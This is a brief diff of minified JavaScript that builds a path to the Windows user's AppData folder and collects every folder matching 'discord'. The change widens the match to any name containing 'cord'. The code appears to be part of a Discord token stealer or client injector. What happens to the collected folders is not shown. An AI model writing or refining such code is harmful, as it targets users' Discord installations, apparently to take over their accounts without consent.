@@ -8,11 +8,11 @@ var r=`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData`,
     a=[];
 e.readdir(o,((e,r)=>{
     e||r.forEach((e=>{
-        (e.includes("discord")||e.includes("Discord"))&&i.push(`${o}/${e}`)
+        (e.includes("cord"))&&i.push(`${o}/${e}`)
     }))
 })),e.readdir(s,((e,r)=>{
     e||r.forEach((e=>{
-        (e.includes("discord")||e.includes("Discord"))&&i.push(`${s}/${e}`)
+        (e.includes("cord"))&&i.push(`${s}/${e}`)
     }))
 })),setTimeout((()=>{
     i.forEach((r=>{
